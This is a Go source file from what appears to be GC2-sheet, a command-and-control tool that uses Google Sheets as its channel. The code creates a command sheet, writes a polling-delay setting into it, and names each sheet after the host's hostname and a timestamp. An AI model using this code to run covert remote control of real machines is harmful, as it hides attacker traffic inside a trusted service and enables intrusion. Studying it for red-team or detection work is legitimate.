package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"fmt"
	"os"
	"strconv"
	"time"

	"google.golang.org/api/sheets/v4"
)

func createSheet(client *sheets.Service, spreadSheet *configuration.SpreadSheet) {

	sheetName := spreadSheet.CommandSheet.Name

	var requests []*sheets.Request

	request := &sheets.Request{}
	addSheetRequest := &sheets.AddSheetRequest{}
	sheetProperties := &sheets.SheetProperties{Title: sheetName}

	addSheetRequest.Properties = sheetProperties
	request.AddSheet = addSheetRequest
	requests = append(requests, request)

	batchupDateSpreadSheetRequest := &sheets.BatchUpdateSpreadsheetRequest{Requests: requests}

	_, err := client.Spreadsheets.BatchUpdate(spreadSheet.SpreadSheetId, batchupDateSpreadSheetRequest).Do()

	if err != nil {
		utils.LogFatalDebug("Error creating new sheet: " + err.Error())
	}

	writeRange := fmt.Sprintf("%s!D2:%s", sheetName, spreadSheet.CommandSheet.RangeTickerConfiguration)
	writeData := [][]interface{}{{"Delay configuration (sec)", spreadSheet.CommandSheet.Ticker}}

	var valueRange = &sheets.ValueRange{
		Range:  writeRange,
		Values: writeData,
	}

	_, err = client.Spreadsheets.Values.Update(spreadSheet.SpreadSheetId, writeRange, valueRange).ValueInputOption("RAW").Do()
	if err != nil {
		utils.LogFatalDebug("Error writing default configuration: " + err.Error())
	}

}

func generateNewSheetName() string {

	currentTime := time.Now()

	currentTimeS := currentTime.Format("02-01-2006")

	unixString := strconv.FormatInt(currentTime.Unix(), 10)

	hostname, err := os.Hostname()
	if err != nil {
		return fmt.Sprintf("%s-%s", currentTime, unixString[len(unixString)-5:])
	}

	return fmt.Sprintf("%s-%s-%s", currentTimeS, hostname, unixString[len(unixString)-5:])

}
